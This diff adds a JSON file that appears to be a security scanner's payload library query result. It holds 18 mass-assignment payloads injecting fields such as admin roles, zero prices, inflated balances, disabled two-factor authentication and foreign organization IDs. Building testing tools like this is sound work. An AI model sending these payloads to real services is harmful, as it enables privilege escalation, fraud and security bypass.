@@ -1,0 +1,298 @@
+{
+  "query": {
+    "limit": 20,
+    "max_risk": 3,
+    "vuln_type": "mass_assignment"
+  },
+  "count": 18,
+  "results": [
+    {
+      "id": "221caa537e0fa33c",
+      "payload": "{\"plan\": \"unlimited\"}",
+      "technique": "mass_assignment",
+      "injection_surface": "json_body",
+      "encoding": "raw",
+      "evidence_type": "response_diff",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "Inject unlimited plan",
+      "source": "ensphere",
+      "tags": [
+        "mass_assignment",
+        "privilege_escalation"
+      ]
+    },
+    {
+      "id": "2b21b78521ed498d",
+      "payload": "{\"is_admin\": true}",
+      "technique": "mass_assignment",
+      "injection_surface": "json_body",
+      "encoding": "raw",
+      "evidence_type": "response_diff",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "Inject is_admin boolean field",
+      "source": "ensphere",
+      "tags": [
+        "mass_assignment",
+        "privilege_escalation"
+      ]
+    },
+    {
+      "id": "35bd2c8f7bae65ff",
+      "payload": "{\"price\": 0}",
+      "technique": "mass_assignment",
+      "injection_surface": "json_body",
+      "encoding": "raw",
+      "evidence_type": "response_diff",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "Inject zero price field",
+      "source": "ensphere",
+      "tags": [
+        "financial",
+        "mass_assignment"
+      ]
+    },
+    {
+      "id": "38e84134a48ef406",
+      "payload": "{\"balance\": 999999}",
+      "technique": "mass_assignment",
+      "injection_surface": "json_body",
+      "encoding": "raw",
+      "evidence_type": "response_diff",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "Inject balance field",
+      "source": "ensphere",
+      "tags": [
+        "financial",
+        "mass_assignment"
+      ]
+    },
+    {
+      "id": "401d7b1d6045a91b",
+      "payload": "{\"active\": true}",
+      "technique": "mass_assignment",
+      "injection_surface": "json_body",
+      "encoding": "raw",
+      "evidence_type": "response_diff",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "Inject active status",
+      "source": "ensphere",
+      "tags": [
+        "mass_assignment",
+        "status_manipulation"
+      ]
+    },
+    {
+      "id": "46c2c116cd1e2b1d",
+      "payload": "{\"discount\": 100}",
+      "technique": "mass_assignment",
+      "injection_surface": "json_body",
+      "encoding": "raw",
+      "evidence_type": "response_diff",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "Inject 100% discount",
+      "source": "ensphere",
+      "tags": [
+        "financial",
+        "mass_assignment"
+      ]
+    },
+    {
+      "id": "48458f3d6a2e2ac6",
+      "payload": "{\"group_id\": \"admin-group\"}",
+      "technique": "mass_assignment",
+      "injection_surface": "json_body",
+      "encoding": "raw",
+      "evidence_type": "response_diff",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "Inject admin group ID",
+      "source": "ensphere",
+      "tags": [
+        "mass_assignment",
+        "privilege_escalation"
+      ]
+    },
+    {
+      "id": "71eda4e60b0aea5f",
+      "payload": "{\"two_factor_enabled\": false}",
+      "technique": "mass_assignment",
+      "injection_surface": "json_body",
+      "encoding": "raw",
+      "evidence_type": "response_diff",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "Disable two-factor authentication",
+      "source": "ensphere",
+      "tags": [
+        "mass_assignment",
+        "security_bypass"
+      ]
+    },
+    {
+      "id": "7c09c669f2152e97",
+      "payload": "{\"credits\": 999999}",
+      "technique": "mass_assignment",
+      "injection_surface": "json_body",
+      "encoding": "raw",
+      "evidence_type": "response_diff",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "Inject credits field",
+      "source": "ensphere",
+      "tags": [
+        "financial",
+        "mass_assignment"
+      ]
+    },
+    {
+      "id": "7ce24ba3730d98b5",
+      "payload": "{\"email_verified\": true}",
+      "technique": "mass_assignment",
+      "injection_surface": "json_body",
+      "encoding": "raw",
+      "evidence_type": "response_diff",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "Inject email verified status",
+      "source": "ensphere",
+      "tags": [
+        "mass_assignment",
+        "status_manipulation"
+      ]
+    },
+    {
+      "id": "9397696ba370bc80",
+      "payload": "{\"role\": \"admin\"}",
+      "technique": "mass_assignment",
+      "injection_surface": "json_body",
+      "encoding": "raw",
+      "evidence_type": "response_diff",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "Inject admin role field",
+      "source": "ensphere",
+      "tags": [
+        "mass_assignment",
+        "privilege_escalation"
+      ]
+    },
+    {
+      "id": "988a94985d5708d8",
+      "payload": "{\"tier\": \"enterprise\"}",
+      "technique": "mass_assignment",
+      "injection_surface": "json_body",
+      "encoding": "raw",
+      "evidence_type": "response_diff",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "Inject enterprise tier",
+      "source": "ensphere",
+      "tags": [
+        "mass_assignment",
+        "privilege_escalation"
+      ]
+    },
+    {
+      "id": "9eea9136eae6c16a",
+      "payload": "{\"organization_id\": \"target-org\"}",
+      "technique": "mass_assignment",
+      "injection_surface": "json_body",
+      "encoding": "raw",
+      "evidence_type": "response_diff",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "Inject target organization ID",
+      "source": "ensphere",
+      "tags": [
+        "mass_assignment",
+        "tenant_manipulation"
+      ]
+    },
+    {
+      "id": "a90d2c56f9e10a5b",
+      "payload": "{\"approved\": true}",
+      "technique": "mass_assignment",
+      "injection_surface": "json_body",
+      "encoding": "raw",
+      "evidence_type": "response_diff",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "Inject approved status field",
+      "source": "ensphere",
+      "tags": [
+        "mass_assignment",
+        "status_manipulation"
+      ]
+    },
+    {
+      "id": "bc8dc9d103aa8c47",
+      "payload": "{\"verified\": true}",
+      "technique": "mass_assignment",
+      "injection_surface": "json_body",
+      "encoding": "raw",
+      "evidence_type": "response_diff",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "Inject verified status field",
+      "source": "ensphere",
+      "tags": [
+        "mass_assignment",
+        "status_manipulation"
+      ]
+    },
+    {
+      "id": "c2c1f198fa65d77f",
+      "payload": "{\"permissions\": [\"admin\", \"write\", \"delete\"]}",
+      "technique": "mass_assignment",
+      "injection_surface": "json_body",
+      "encoding": "raw",
+      "evidence_type": "response_diff",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "Inject permissions array",
+      "source": "ensphere",
+      "tags": [
+        "mass_assignment",
+        "privilege_escalation"
+      ]
+    },
+    {
+      "id": "d948d0a4c7afa373",
+      "payload": "{\"admin\": true}",
+      "technique": "mass_assignment",
+      "injection_surface": "json_body",
+      "encoding": "raw",
+      "evidence_type": "response_diff",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "Inject admin boolean field",
+      "source": "ensphere",
+      "tags": [
+        "mass_assignment",
+        "privilege_escalation"
+      ]
+    },
+    {
+      "id": "f9b3620d63a35493",
+      "payload": "{\"account_type\": \"premium\"}",
+      "technique": "mass_assignment",
+      "injection_surface": "json_body",
+      "encoding": "raw",
+      "evidence_type": "response_diff",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "Inject premium account type",
+      "source": "ensphere",
+      "tags": [
+        "mass_assignment",
+        "privilege_escalation"
+      ]
+    }
+  ]
+}
